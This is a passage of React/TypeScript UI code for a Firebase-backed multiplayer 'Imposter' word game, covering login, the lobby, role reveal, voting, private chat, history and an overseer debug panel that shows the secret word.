      navigator.clipboard.writeText(text);
      alert('Results copied to clipboard!');
    }
  };

  const formatTime = (seconds: number) => {
    const m = Math.floor(seconds / 60);
    const s = seconds % 60;
    return `${m}:${s < 10 ? '0' : ''}${s}`;
  };

  if (loading && !user) return <div className="min-h-screen flex items-center justify-center bg-yellow-200 text-black font-black text-4xl animate-bounce uppercase">Loading...</div>;

  const appClasses = `min-h-screen font-sans transition-colors duration-500 overflow-x-hidden bg-slate-50 text-slate-900 dark:bg-slate-900 dark:text-white ${isImposterTheme ? '!bg-red-950/80 !text-red-50' : ''}`;

  return (
    <div className={`${darkMode ? 'dark' : ''}`}>
      <div className={appClasses}>
        <div style={{ position: 'fixed', top: 0, left: 0, width: '100%', height: '100vh', zIndex: -20, pointerEvents: 'none' }}>
          <Particles particleColors={["#ffffff", "#fde047", "#22d3ee", "#d946ef"]} particleCount={150} speed={0.4} moveParticlesOnHover={true} />
        </div>

        <header className={`fixed top-0 w-full p-2 z-50 flex justify-between items-start pointer-events-none`}>
          <div className="flex gap-2 pointer-events-auto">
             <AnimatedThemeToggler isDark={darkMode} onToggle={() => setDarkMode(!darkMode)} />
             {user && (
               <button onClick={handleGodModeTrigger} className="p-3 bg-pink-300 border-4 border-black dark:border-white rounded-full shadow-[4px_4px_0px_0px_rgba(0,0,0,1)] dark:shadow-[4px_4px_0px_0px_rgba(255,255,255,0.2)] hover:translate-y-1 transition-transform group relative">
                 <HelpCircle size={20} className="text-black group-hover:animate-spin" />
               </button>
             )}
          </div>
          <div className="flex flex-col gap-1 items-end pointer-events-auto">
             <div className="bg-white dark:bg-slate-800 border-4 border-black dark:border-slate-700 rounded-xl px-3 py-1 text-xs font-bold shadow-[2px_2px_0px_0px_rgba(0,0,0,1)] dark:shadow-[2px_2px_0px_0px_rgba(0,0,0,0.5)] flex items-center gap-1">
               <Clock size={12}/> {currentTime.toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'})}
             </div>
             {user && (
               <>
                 <div className="bg-lime-300 dark:bg-lime-600 border-4 border-black dark:border-slate-700 rounded-xl px-3 py-1 text-xs font-bold shadow-[2px_2px_0px_0px_rgba(0,0,0,1)] dark:shadow-[2px_2px_0px_0px_rgba(0,0,0,0.5)] flex items-center gap-1">
                   <Eye size={12}/> Page: {formatTime(pageTime)}
                 </div>
                 {room && (
                   <div className="bg-cyan-300 dark:bg-cyan-700 border-4 border-black dark:border-slate-700 rounded-xl px-3 py-1 text-xs font-bold shadow-[2px_2px_0px_0px_rgba(0,0,0,1)] dark:shadow-[2px_2px_0px_0px_rgba(0,0,0,0.5)] flex items-center gap-1">
                     <Play size={12}/> Room: {formatTime(roomTime)}
                   </div>
                 )}
               </>
             )}
          </div>
        </header>

        {showGodMode && (
          <div className="fixed inset-0 z-[100] flex items-center justify-center p-4 bg-black/80 backdrop-blur-sm">
            <NeoPanel color="bg-purple-400 dark:bg-purple-900" className="w-full max-w-2xl max-h-[90vh] overflow-y-auto animate-wobble">
              <div className="flex justify-between items-center mb-6 border-b-4 border-black dark:border-white pb-4">
                <h2 className="text-4xl font-black funky-font text-white uppercase drop-shadow-[2px_2px_0px_rgba(0,0,0,1)]">👁️ OVERSEER PANEL</h2>
                <button onClick={() => setShowGodMode(false)} className="bg-red-500 border-4 border-black dark:border-white rounded-full p-2 font-black text-white">X</button>
              </div>
              {room ? (
                <div className="space-y-4">
                  <div className="bg-white dark:bg-slate-800 p-4 border-4 border-black dark:border-slate-700 rounded-xl">
                    <h3 className="font-bold text-xl">Secret Word: <span className="text-fuchsia-600 animate-pulse">{room.word || 'Not set'}</span></h3>
                    <h3 className="font-bold text-xl">Imposter IDs: <span className="text-red-600">{room.imposterIds.join(', ') || 'Not set'}</span></h3>
                  </div>
                  <pre className="text-xs overflow-x-auto p-2 bg-black text-lime-400 rounded-lg">
                    {JSON.stringify(room, null, 2)}
                  </pre>
                </div>
              ) : (
                <p className="font-bold text-xl text-center p-10">Join a room first to see secrets!</p>
              )}
            </NeoPanel>
          </div>
        )}

        <main className="pt-24 pb-20 px-4 max-w-4xl mx-auto flex flex-col gap-6 relative z-10 min-h-[90vh]">
          
          {!user ? (
            <div className="flex flex-col gap-8 items-center justify-center min-h-[60vh]">
              <NeoPanel className="w-full max-w-md flex flex-col gap-6 !p-8 items-center text-center animate-float">
                <UserCheck size={64} className="text-fuchsia-500 mb-2" />
                <h2 className="text-4xl font-black uppercase funky-font drop-shadow-[2px_2px_0px_rgba(0,0,0,0.2)]">
                  {isSignup ? 'Create Account' : 'Welcome Back'}
                </h2>
                
                <div className="w-full text-left flex flex-col gap-4">
                  {isSignup && (
                    <div>
                      <label className="font-bold mb-1 block uppercase text-xs">Display Name</label>
                      <input type="text" value={nameInput} onChange={(e) => setNameInput(e.target.value)} className="w-full border-4 border-black dark:border-slate-600 p-3 rounded-xl font-bold bg-slate-50 dark:bg-slate-900 focus:ring-4 focus:ring-fuchsia-400" placeholder="Funk Name" />
                    </div>
                  )}
                  <div>
                    <label className="font-bold mb-1 block uppercase text-xs">Email</label>
                    <input type="email" value={email} onChange={(e) => setEmail(e.target.value)} className="w-full border-4 border-black dark:border-slate-600 p-3 rounded-xl font-bold bg-slate-50 dark:bg-slate-900 focus:ring-4 focus:ring-fuchsia-400" placeholder="email@example.com" />
                  </div>
                  <div>
                    <label className="font-bold mb-1 block uppercase text-xs">Password</label>
                    <input type="password" value={password} onChange={(e) => setPassword(e.target.value)} className="w-full border-4 border-black dark:border-slate-600 p-3 rounded-xl font-bold bg-slate-50 dark:bg-slate-900 focus:ring-4 focus:ring-fuchsia-400" placeholder="••••••••" />
                  </div>
                </div>
                
                {error && <p className="text-red-500 font-bold text-sm bg-red-100 dark:bg-red-950 p-2 rounded border-2 border-black w-full">{error}</p>}

                <NeoButton color="bg-lime-400 dark:bg-lime-600" className="w-full text-xl" onClick={handleAuth}>
                  {isSignup ? 'SIGN UP' : 'LOGIN'}
                </NeoButton>

                <button onClick={() => setIsSignup(!isSignup)} className="font-bold text-sm underline opacity-70">
                  {isSignup ? 'Already have an account? Login' : "Don't have an account? Sign Up"}
                </button>
              </NeoPanel>
            </div>
          ) : !room ? (
            <div className="flex flex-col gap-8 items-center mt-10">
              <div className="text-center w-full max-w-md">
                 <h2 className="text-xl font-bold opacity-70 uppercase tracking-widest">Logged in as</h2>
                 <p className="text-5xl font-black text-fuchsia-500 uppercase funky-font drop-shadow-[2px_2px_0px_rgba(0,0,0,1)]">{profile.name}</p>
                 
                 {/* All-time Stats Grid */}
                 <div className="grid grid-cols-2 gap-4 mt-6">
                    <div className="bg-white dark:bg-slate-800 border-4 border-black p-3 rounded-2xl shadow-[4px_4px_0px_0px_rgba(0,0,0,1)]">
                      <p className="text-[10px] font-black uppercase opacity-50">Win Rate</p>
                      <p className="text-2xl font-black text-emerald-500">
                        {profile.stats.totalGames > 0 ? Math.round((profile.stats.wins / profile.stats.totalGames) * 100) : 0}%
                      </p>
                    </div>
                    <div className="bg-white dark:bg-slate-800 border-4 border-black p-3 rounded-2xl shadow-[4px_4px_0px_0px_rgba(0,0,0,1)]">
                      <p className="text-[10px] font-black uppercase opacity-50">Accuracy</p>
                      <p className="text-2xl font-black text-blue-500">
                        {profile.stats.totalVotes > 0 ? Math.round((profile.stats.correctVotes / profile.stats.totalVotes) * 100) : 0}%
                      </p>
                    </div>
                    <div className="bg-white dark:bg-slate-800 border-4 border-black p-3 rounded-2xl shadow-[4px_4px_0px_0px_rgba(0,0,0,1)]">
                      <p className="text-[10px] font-black uppercase opacity-50">Games</p>
                      <p className="text-2xl font-black">{profile.stats.totalGames}</p>
                    </div>
                    <div className="bg-white dark:bg-slate-800 border-4 border-black p-3 rounded-2xl shadow-[4px_4px_0px_0px_rgba(0,0,0,1)]">
                      <p className="text-[10px] font-black uppercase opacity-50">Imp Win</p>
                      <p className="text-2xl font-black text-red-500">{profile.stats.imposterWins}</p>
                    </div>
                 </div>

                 <button onClick={handleLogout} className="text-xs font-bold underline mt-6 flex items-center gap-1 mx-auto text-red-500 hover:scale-110 transition-transform">
                   <LogOut size={12}/> Logout
                 </button>
              </div>

              <div className="flex flex-col md:flex-row gap-4 w-full max-w-md">
                <NeoButton color="bg-lime-400 dark:bg-lime-600" className="flex-1 text-xl" onClick={createRoom}>
                  <Play fill="currentColor" /> CREATE ROOM
                </NeoButton>
                <NeoPanel color="bg-cyan-200 dark:bg-cyan-800" className="flex-1 flex flex-col gap-2 !p-4">
                  <input type="text" value={roomId} onChange={e => setRoomId(e.target.value.toUpperCase())} placeholder="ROOM CODE" className="w-full border-4 border-black dark:border-slate-600 p-2 rounded-xl font-black text-center text-xl uppercase bg-white dark:bg-slate-900" />
                  <NeoButton color="bg-white dark:bg-slate-700" className="w-full" onClick={() => joinRoom()}>JOIN</NeoButton>
                </NeoPanel>
              </div>
            </div>
          ) : (
            <div className="flex flex-col lg:flex-row gap-6 w-full max-w-6xl mx-auto">
              <div className="flex-1 flex flex-col gap-6">
                {/* STATUS BAR */}
                <div className="flex flex-col gap-2">
                  <div className="bg-black dark:bg-slate-800 text-white p-3 rounded-2xl border-4 border-fuchsia-500 flex justify-between items-center shadow-[4px_4px_0px_0px_rgba(217,70,239,1)]">
                    <div className="flex items-center gap-4">
                      <span className="font-black text-xl bg-fuchsia-500 text-black px-3 py-1 rounded-xl uppercase">ROOM: {room.id}</span>
                    </div>
                    <button onClick={leaveRoom} className="text-red-400 hover:text-red-300 font-bold flex items-center gap-1"><Home size={18} /> LEAVE</button>
                  </div>
                  
                  {/* Match Feed / System Log */}
                  <div className="bg-slate-800/50 border-2 border-black rounded-xl p-2 flex items-center gap-2 overflow-hidden h-10">
                    <span className="text-[10px] font-black bg-yellow-400 text-black px-2 py-0.5 rounded uppercase flex-shrink-0 animate-pulse">FEED:</span>
                    <div className="flex-1 overflow-hidden">
                      <div className="whitespace-nowrap animate-[scroll_20s_linear_infinite] hover:pause text-xs font-bold text-slate-300">
                        {room.chats?.filter(c => c.sender === 'System').slice(-3).map((c, i) => (
                          <span key={i} className="mr-8 italic">⚡ {c.msg}</span>
                        )) || "Waiting for action..."}
                      </div>
                    </div>
                  </div>
                </div>

                {room.state === 'lobby' && (
                  <NeoPanel color="bg-yellow-200 dark:bg-yellow-900" className="flex flex-col gap-6 relative overflow-hidden">
                    <div className="absolute top-[-20px] right-[-20px] opacity-10 pointer-events-none"><Settings size={200} className="animate-spin-slow" /></div>
                    <h2 className="text-3xl font-black uppercase flex items-center gap-2 relative z-10"><Users /> Lobby</h2>
                    <div className="bg-white dark:bg-slate-800 border-4 border-black dark:border-slate-600 p-4 rounded-xl flex flex-col md:flex-row items-center justify-between gap-4 relative z-10 shadow-[4px_4px_0px_0px_rgba(0,0,0,1)]">
                       <div className="flex flex-col flex-1 overflow-hidden w-full">
                          <span className="text-xs font-black uppercase flex items-center gap-1 opacity-60 mb-1"><Link size={12}/> Invite Link</span>
                          <div className="font-mono text-sm break-all bg-slate-100 dark:bg-slate-900 p-2 rounded border-2 border-slate-300 select-all">
                            {`${window.location.origin}${window.location.pathname}?room=${room.id}`}
                          </div>
                       </div>
                       <NeoButton onClick={copyInviteLink} color="bg-fuchsia-400 dark:bg-fuchsia-600" className="!py-2 !text-sm w-full md:w-auto"><Copy size={16} /> Copy</NeoButton>
                    </div>

                    <div className="grid grid-cols-1 md:grid-cols-2 gap-4 relative z-10">
                      <div className="bg-white dark:bg-slate-800 border-4 border-black dark:border-slate-600 p-4 rounded-xl shadow-[4px_4px_0px_0px_rgba(0,0,0,1)]">
                        <h3 className="font-bold mb-2 uppercase border-b-2 border-black pb-1">Players ({Object.keys(room.players).length})</h3>
                        <ul className="space-y-2">
                          {Object.entries(room.players).map(([id, p]) => (
                            <li key={id} className="flex justify-between items-center font-bold">
                              <span>{p.name} {id === user!.uid && <span className="text-fuchsia-500 text-sm">(You)</span>}</span>
                              {id === room.hostId && <span className="text-xs bg-yellow-400 dark:bg-yellow-600 border-2 border-black px-2 py-0.5 rounded-full text-black">HOST</span>}
                            </li>
                          ))}
                        </ul>
                      </div>
                      <div className="flex flex-col gap-4">
                        <div className="bg-cyan-100 dark:bg-cyan-900 border-4 border-black dark:border-slate-600 p-4 rounded-xl shadow-[4px_4px_0px_0px_rgba(0,0,0,1)]">
                          <label className="font-bold mb-2 block uppercase">Word Category:</label>
                          <select disabled={user!.uid !== room.hostId} value={room.category} onChange={(e) => updateDoc(doc(db, 'rooms', room.id), { category: e.target.value })} className="w-full border-4 border-black rounded-lg p-2 font-bold bg-white dark:bg-slate-800">
                            {Object.keys(CATEGORIES).map(c => <option key={c} value={c}>{c}</option>)}
                          </select>
                        </div>

                        <div className="bg-orange-100 dark:bg-orange-900 border-4 border-black dark:border-slate-600 p-4 rounded-xl shadow-[4px_4px_0px_0px_rgba(0,0,0,1)]">
                          <label className="font-bold mb-2 block uppercase">Imposters:</label>
                          <select 
                            disabled={user!.uid !== room.hostId} 
                            value={room.imposterCount || 1} 
                            onChange={(e) => updateDoc(doc(db, 'rooms', room.id), { imposterCount: parseInt(e.target.value) })} 
                            className="w-full border-4 border-black rounded-lg p-2 font-bold bg-white dark:bg-slate-800"
                          >
                            {[1, 2, 3].map(n => (
                              <option key={n} value={n}>{n} Imposter{n > 1 ? 's' : ''}</option>
                            ))}
                          </select>
                        </div>
                      </div>
                    </div>
                    {user!.uid === room.hostId && <SlideConfirm onConfirm={startGame} text="SWIPE TO START" color="bg-lime-400 dark:bg-lime-600" />}
                  </NeoPanel>
                )}

                {room.state === 'playing' && (
                  <NeoPanel color={isImposterTheme ? "bg-red-900 border-red-500" : "bg-white dark:bg-slate-800"} className="flex flex-col gap-6 transition-colors duration-1000">
                    <div className="text-center flex flex-col items-center gap-4">
                      <h2 className={`text-2xl font-black uppercase ${isImposterTheme ? 'text-red-200' : ''}`}>Round {room.round} of {room.maxRounds}</h2>
                      {!room.players[user!.uid]?.isRoleRevealed ? (
                        <div className="w-full max-w-sm bg-slate-800 p-6 rounded-3xl border-4 border-black shadow-[8px_8px_0px_0px_rgba(0,0,0,1)]">
                          <h3 className="text-white font-black text-2xl mb-2 uppercase funky-font">Who are you?</h3>
                          <MonteCards onSelectCard={async () => {
                            const rRef = doc(db, 'rooms', room.id);
                            await updateDoc(rRef, { [`players.${user.uid}.isRoleRevealed`]: true });
                          }} />
                        </div>
                      ) : (
                        <div className={`p-8 rounded-3xl border-8 shadow-[8px_8px_0px_0px_rgba(0,0,0,1)] w-full max-w-md animate-float ${isImposterTheme ? 'bg-red-950 border-red-600 shadow-red-950/50' : 'bg-cyan-100 dark:bg-cyan-900 border-black'}`}>
                          <h3 className={`text-xl font-black uppercase mb-2 ${isImposterTheme ? 'text-red-400' : 'text-slate-500'}`}>Your Role is</h3>
                          <div className={`text-6xl font-black funky-font uppercase mb-6 drop-shadow-[2px_2px_0px_rgba(0,0,0,1)] ${isImposterTheme ? 'text-red-500' : 'text-blue-500'}`}>{room.players[user!.uid]?.role}</div>
                          <div className="bg-black p-4 rounded-xl border-4 border-white text-left">
                            <p className="text-white font-bold text-sm mb-1 uppercase text-center">Secret Word</p>
                            <p className={`text-3xl font-black text-center ${isImposterTheme ? 'text-red-500 filter blur-sm hover:blur-none transition-all' : 'text-lime-400'}`}>{isImposterTheme ? '???' : room.word}</p>
                          </div>
                        </div>
                      )}
                    </div>
                    <div className="bg-slate-200 dark:bg-slate-700 border-4 border-black rounded-2xl p-4">
                      <h3 className="font-bold text-lg mb-4 uppercase">Turn Order</h3>
                      <div className="flex flex-wrap gap-2">
                        {room.turnOrder.map((pId, idx) => {
                          const isCurrent = idx === room.currentTurnIndex;
                          const pName = room.players[pId]?.name;
                          return (
                            <div key={pId} className={`flex items-center gap-2 px-4 py-2 rounded-xl border-4 font-bold transition-all ${isCurrent ? 'bg-yellow-400 border-black animate-blink scale-110 shadow-[4px_4px_0px_0px_rgba(0,0,0,1)] text-black' : 'bg-white border-slate-400 scale-90 opacity-70'}`}>
                              {isCurrent && <span className="text-xl">👉</span>}
                              <span>{pName} {pId === user!.uid && '(You)'}</span>
                              
                              {isCurrent && (
                                <div className="ml-2 flex items-center gap-2">
                                  <span className="text-xs bg-black/10 px-2 py-1 rounded-full">
                                    {room.players[pId].passedTurn?.length || 0} / {Math.floor(Object.keys(room.players).length / 2) + 1}
                                  </span>
                                  {pId !== user!.uid && !room.players[pId].passedTurn?.includes(user!.uid) && (
                                    <button onClick={() => passTurn(pId)} className="bg-red-400 text-black text-xs border-2 border-black rounded px-2 py-1">PASS</button>
                                  )}
                                  {pId === user!.uid && !room.players[pId].passedTurn?.includes(user!.uid) && (
                                    <button onClick={() => passTurn(pId)} className="bg-lime-400 text-black text-xs border-2 border-black rounded px-2 py-1">DONE</button>
                                  )}
                                </div>
                              )}
                            </div>
                          );
                        })}
                      </div>
                    </div>
                  </NeoPanel>
                )}

                {room.state === 'voting' && (
                  <NeoPanel color="bg-purple-200 dark:bg-purple-900" className="flex flex-col gap-8 items-center min-h-[60vh] justify-center">
                     <div className="text-center">
                       <h2 className="text-5xl font-black uppercase funky-font text-white bg-black px-8 py-4 rounded-3xl border-8 border-fuchsia-500 animate-suspense shadow-[0_0_50px_rgba(217,70,239,0.5)] mb-4">
                         VOTING TIME!
                       </h2>
                       <p className="text-xl font-black uppercase opacity-60 italic">Who is the Imposter? Decide wisely...</p>
                     </div>

                     <div className="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-6 w-full max-w-5xl">
                       {Object.entries(room.players).map(([id, p]) => {
                         const hasVotedMe = room.votes[user!.uid] === id;
                         const votersForThisPerson = Object.entries(room.votes).filter(([_, votedId]) => votedId === id).map(([voterId, _]) => voterId);
                         const voteCount = votersForThisPerson.length;
                         
                         return (
                           <div key={id} className="relative group">
                             <button
                               onClick={() => castVote(id)}
                               className={`w-full flex flex-col items-center justify-center p-6 border-4 border-black rounded-3xl font-black text-xl transition-all duration-300
                                 ${hasVotedMe ? 'bg-lime-400 scale-105 shadow-[10px_10px_0px_rgba(0,0,0,1)] -translate-y-2' : 'bg-white hover:bg-slate-50 shadow-[6px_6px_0px_rgba(0,0,0,1)] hover:-translate-y-1'}
                                 ${voteCount > 0 ? 'animate-none' : ''}
                               `}
                             >
                               <div className="w-16 h-16 bg-slate-200 rounded-full flex items-center justify-center mb-4 border-4 border-black group-hover:rotate-12 transition-transform">
                                 <Skull className={voteCount > 0 ? 'text-red-600' : 'text-slate-400'} size={32} />
                               </div>
                               
                               <div className="text-center leading-tight mb-2 uppercase truncate w-full">{p.name}</div>
                               
                               <div className={`text-xs bg-black text-white rounded-full px-3 py-1 inline-block transition-all ${voteCount > 0 ? 'scale-110 bg-red-600' : 'opacity-40'}`}>
                                 {voteCount} VOTE{voteCount !== 1 ? 'S' : ''}
                               </div>
                               
                               {/* Real-time Voter Tags */}
                               <div className="mt-4 flex flex-wrap justify-center gap-1 min-h-[20px]">
                                 {votersForThisPerson.map(voterId => (
                                   <div 
                                     key={voterId} 
                                     className="text-[9px] bg-black text-white px-2 py-0.5 rounded-full font-black animate-vote-pop shadow-[2px_2px_0px_rgba(255,255,255,0.2)]"
                                   >
                                     {room.players[voterId]?.name}
                                   </div>
                                 ))}
                               </div>
                             </button>
                             
                             {/* Suspense indicators for people who haven't voted */}
                             {!room.votes[id] && (
                               <div className="absolute -top-2 -right-2 bg-yellow-400 border-2 border-black p-1 rounded-lg animate-bounce rotate-12">
                                 <Clock size={12} className="text-black" />
                               </div>
                             )}
                           </div>
                         );
                       })}
                     </div>

                     {/* Voting Progress */}
                     <div className="w-full max-w-md bg-white border-4 border-black p-4 rounded-2xl shadow-[8px_8px_0px_rgba(0,0,0,1)]">
                        <div className="flex justify-between items-center mb-2 font-black uppercase text-xs">
                          <span>Progress</span>
                          <span>{Object.keys(room.votes).length} / {Object.keys(room.players).length} Voted</span>
                        </div>
                        <div className="w-full bg-slate-200 h-6 border-4 border-black rounded-full overflow-hidden">
                          <div 
                            className="bg-fuchsia-500 h-full transition-all duration-1000 ease-out"
                            style={{ width: `${(Object.keys(room.votes).length / Object.keys(room.players).length) * 100}%` }}
                          />
                        </div>
                     </div>
                  </NeoPanel>
                )}

                {room.state === 'result' && (
                  <ResultScreen room={room} user={user!} resetGame={resetGame} shareResults={shareResults} />
                )}
              </div>

              <div className="w-full lg:w-80 flex flex-col gap-6">
                <NeoPanel color="bg-white dark:bg-slate-800" className="flex-1 min-h-[500px] max-h-[650px] flex flex-col p-4 !pb-2">
                  <h3 className="font-black uppercase border-b-4 border-black pb-2 mb-4 flex items-center justify-between">
                    <div className="flex items-center gap-2">
                      <MessageSquare /> Secret DM
                    </div>
                    {selectedChatUser && (
                      <span className="text-[10px] bg-fuchsia-500 text-white px-2 py-0.5 rounded-full animate-pulse">
                        TO: {room.players[selectedChatUser]?.name}
                      </span>
                    )}
                  </h3>
                  
                  {/* Player Contact List */}
                  <div className="flex flex-col gap-2 mb-4 overflow-y-auto max-h-32 p-1 border-b-2 border-slate-200 dark:border-slate-700">
                     <span className="text-[10px] font-black uppercase opacity-50">Select Player:</span>
                     <div className="flex flex-wrap gap-2">
                        {Object.keys(room.players).filter(id => id !== user!.uid).map(pId => (
                           <button 
                              key={pId} 
                              onClick={() => { playSound('click'); setSelectedChatUser(pId); }} 
                              className={`px-3 py-1 border-2 border-black rounded-xl text-xs font-bold transition-all ${selectedChatUser === pId ? 'bg-lime-400 shadow-[2px_2px_0px_rgba(0,0,0,1)] scale-105' : 'bg-slate-100 dark:bg-slate-700 opacity-70 hover:opacity-100'}`}
                           >
                              {room.players[pId].name}
                           </button>
                        ))}
                     </div>
                  </div>

                  {/* DM Chat Area */}
                  <div className="flex-1 overflow-y-auto flex flex-col gap-3 mb-4 pr-2 bg-slate-50 dark:bg-slate-900 rounded-xl p-3 border-2 border-slate-200 dark:border-slate-700 shadow-inner">
                    {!selectedChatUser ? (
                      <div className="h-full flex items-center justify-center text-center p-4">
                        <p className="font-bold text-xs opacity-40 uppercase">Pick a player above to start a secret conversation...</p>
                      </div>
                    ) : (
                      <>
                        {room.chats?.filter(c => 
                            (c.senderId === user!.uid && c.recipientId === selectedChatUser) || 
                            (c.senderId === selectedChatUser && c.recipientId === user!.uid)
                        ).map((c, i) => {
                          const isMe = c.senderId === user!.uid;
                          return (
                            <div key={i} className={`flex flex-col ${isMe ? 'items-end' : 'items-start'} w-full`}>
                              <div className={`p-2.5 rounded-2xl border-2 border-black text-sm font-bold w-max max-w-[85%] break-words ${isMe ? 'bg-lime-300' : 'bg-purple-300'}`}>
                                {c.msg}
                              </div>
                            </div>
                          )
                        })}
                        {room.chats?.filter(c => 
                            (c.senderId === user!.uid && c.recipientId === selectedChatUser) || 
                            (c.senderId === selectedChatUser && c.recipientId === user!.uid)
                        ).length === 0 && (
                          <div className="text-center opacity-30 text-[10px] font-bold mt-4 uppercase italic">No messages yet. Stay sneaky!</div>
                        )}
                      </>
                    )}
                    <div ref={chatEndRef} />
                  </div>

                  <form onSubmit={sendChat} className="flex gap-2">
                    <input 
                      type="text" 
                      value={chatMsg} 
                      onChange={e => setChatMsg(e.target.value)} 
                      disabled={!selectedChatUser} 
                      className="flex-1 border-4 border-black rounded-xl px-3 py-2 font-bold bg-white dark:bg-slate-900 text-black dark:text-white focus:outline-none focus:ring-4 focus:ring-fuchsia-400 disabled:opacity-50" 
                      placeholder={selectedChatUser ? `Secret to ${room.players[selectedChatUser]?.name}...` : "Select a player..."} 
                    />
                    <NeoButton color="bg-cyan-400" disabled={!selectedChatUser} className="!px-4 !py-2">
                      <Send size={18}/>
                    </NeoButton>
                  </form>
                </NeoPanel>

                <NeoPanel color="bg-slate-200 dark:bg-slate-800" className="max-h-[300px] overflow-y-auto p-4">
                  <h3 className="font-black uppercase border-b-4 border-black pb-2 mb-4 flex gap-2"><History /> History</h3>
                  <div className="flex flex-col gap-3">
                    {room.historyLog?.slice().reverse().map((h, i) => (
                      <div key={i} className="bg-white dark:bg-slate-900 border-2 border-black p-3 rounded-lg text-xs font-bold">
                        <div className="text-red-500 mb-1">{h.result}</div>
                        <div className="flex justify-between text-slate-500 border-t pt-1"><span>Word: {h.word}</span><span>{formatTime(h.duration)}</span></div>
                      </div>
                    ))}
                  </div>
                </NeoPanel>
              </div>
            </div>
          )}
        </main>
      </div>
    </div>
  );
}
